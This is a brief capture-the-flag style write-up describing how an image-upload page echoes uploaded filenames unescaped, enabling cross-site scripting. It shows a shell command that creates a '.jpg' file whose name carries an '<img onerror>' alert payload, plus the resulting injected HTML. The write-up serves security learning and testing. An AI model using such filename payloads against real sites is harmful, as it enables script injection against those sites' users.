# BONUS XSS breach on filename image upload

While trying to exploit a security breach on the `http://IP/index.php?page=upload` we've found an XSS breach on the uploaded filename.

After testing a huge file size upload to make the server crash etc. We've found out that the server looks like only allowing the upload of `.jpg` files.

When everything goes well, the server stores the file using the same filename as sent and displays the created image path on the page.

Example after submitting a `filename.jpg` image:
```txt
/tmp/filename.jpg successfully uploaded.
```

Lets try out few things.

## The XSS exploit

First create your evil file

```shell
touch "<img src=a onerror=console.log(alert('XSS'))>.jpg"
```

Then upload it and voila.
The page reloads interpreting the filename as html, to finally execute the onerror attribute code, displaying an alert modal.

Results in:
```html
<pre>
    /tmp/
    <img src="a" onerror="console.log(alert('XSS'))">
    .jpg successfully uploaded.
</pre>
```